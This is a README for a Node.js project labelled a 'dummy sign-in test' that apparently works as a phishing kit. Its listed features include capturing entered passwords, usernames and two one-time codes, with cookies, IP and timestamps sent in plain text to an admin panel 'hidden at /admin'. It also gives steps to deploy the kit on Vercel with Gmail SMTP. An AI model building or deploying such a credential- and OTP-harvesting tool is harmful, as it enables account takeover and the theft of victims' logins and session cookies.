# Dummy Sign-In Test (with real random OTP via Nodemailer)

Multi-step dummy authentication that generates **random 6-digit OTPs** and sends them to the user’s email using **Nodemailer + Gmail SMTP**.

## Features
- Email + Password (any value) → OTP 1 generated & sent to user
- Username + Confirm Password (must match first password)
- OTP 1 & OTP 2 (random)
- Admin receives every step in plain text (Cookies, IP, Timestamp…)
- **Admin can set their own password on first login**
- Admin panel hidden at `/admin`

## URLs (after deploying to Vercel)

| Page            | URL                                        |
|-----------------|--------------------------------------------|
| User login      | `https://your-project.vercel.app/`         |
| **Admin panel** | `https://your-project.vercel.app/admin`    |

## Admin – First Login

1. Go to `/admin`
2. Because no password exists yet, you will see **“Set Your Admin Password”**
3. Enter a password (using your admin email `blessedresult6@gmail.com`)
4. After setting it you are logged in
5. Next time you just log in with that password

You can also force a password via the environment variable `ADMIN_PASSWORD` (useful on Vercel).

## Local Setup

```bash
cp .env.example .env
# Edit .env with your Gmail App Password
npm install
npm start
```

- User: http://localhost:3000/
- Admin: http://localhost:3000/admin

## Deploy to Vercel

1. Import the GitHub repo on Vercel
2. Add Environment Variables:
   - `GMAIL_USER` = `blessedresult6@gmail.com`
   - `GMAIL_APP_PASSWORD` = your 16-char App Password
   - `ADMIN_PASSWORD` = (optional) a password you choose
3. Deploy

Admin will be available at:
**`https://your-project.vercel.app/admin`**

Repo: https://github.com/Dennisbed1234/dummy-signin-test
